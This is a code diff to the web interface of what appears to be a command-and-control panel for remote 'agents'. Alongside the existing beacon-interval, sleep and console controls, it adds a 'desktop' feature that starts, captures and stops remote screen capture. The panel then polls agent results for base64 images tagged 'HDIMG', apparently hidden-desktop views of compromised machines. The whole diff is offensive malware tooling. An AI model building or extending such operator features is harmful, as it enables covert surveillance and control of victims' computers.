@@ -339,6 +339,9 @@
                 case 'interact':
                     openConsole(selectedAgentId);
                     break;
+                case 'desktop':
+                    openDesktop(selectedAgentId);
+                    break;
                 case 'sleep':
                     var interval = prompt('Beacon interval (seconds):');
                     if (interval) await api('POST', '/agents/' + selectedAgentId + '/sleep', { interval: parseInt(interval) });
@@ -589,6 +592,51 @@
         document.getElementById('bottom-panel').style.height = (94 - pct) + '%';
     });
     document.addEventListener('mouseup', function() { isDragging = false; });
+
+    var desktopAgent = null;
+    var desktopTimer = null;
+
+    function openDesktop(agentId) {
+        desktopAgent = agentId;
+        document.getElementById('desktop-overlay').classList.remove('hidden');
+        document.getElementById('desktop-status').textContent = 'Agent ' + agentId;
+        pollDesktop();
+        if (desktopTimer) clearInterval(desktopTimer);
+        desktopTimer = setInterval(pollDesktop, 2000);
+    }
+
+    async function desktopAction(action) {
+        if (!desktopAgent) return;
+        document.getElementById('desktop-status').textContent = action + '...';
+        await api('POST', '/agents/' + desktopAgent + '/desktop', { command: action });
+        await pollDesktop();
+    }
+
+    async function pollDesktop() {
+        if (!desktopAgent) return;
+        try {
+            var rows = await api('GET', '/agents/' + desktopAgent + '/results');
+            if (!rows) return;
+            for (var i = rows.length - 1; i >= 0; i--) {
+                var out = rows[i].output || '';
+                if (out.indexOf('HDIMG:') === 0) {
+                    document.getElementById('desktop-img').src = 'data:image/bmp;base64,' + out.slice(6);
+                    document.getElementById('desktop-img').classList.remove('hidden');
+                    document.getElementById('desktop-status').textContent = 'frame ' + out.length + ' bytes';
+                    return;
+                }
+            }
+        } catch (e) {}
+    }
+
+    document.getElementById('desktop-start').addEventListener('click', function() { desktopAction('start'); });
+    document.getElementById('desktop-frame').addEventListener('click', function() { desktopAction('frame'); });
+    document.getElementById('desktop-stop').addEventListener('click', function() { desktopAction('stop'); });
+    document.getElementById('desktop-close').addEventListener('click', function() {
+        document.getElementById('desktop-overlay').classList.add('hidden');
+        if (desktopTimer) clearInterval(desktopTimer);
+        desktopAgent = null;
+    });
 
     // --- Auto-refresh agents every 5s ---
     setInterval(refreshAgents, 5000);
